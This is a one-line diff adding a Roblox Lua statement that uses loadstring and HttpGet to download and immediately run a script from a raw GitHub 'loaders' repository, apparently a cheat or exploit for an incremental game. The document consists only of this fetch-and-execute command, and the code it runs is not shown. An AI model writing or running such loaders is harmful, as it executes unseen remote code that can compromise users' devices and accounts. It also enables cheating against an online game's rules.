@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/upd-5-noob-incremental-spam3-zmaqirdqo1k2ud.lua"))()
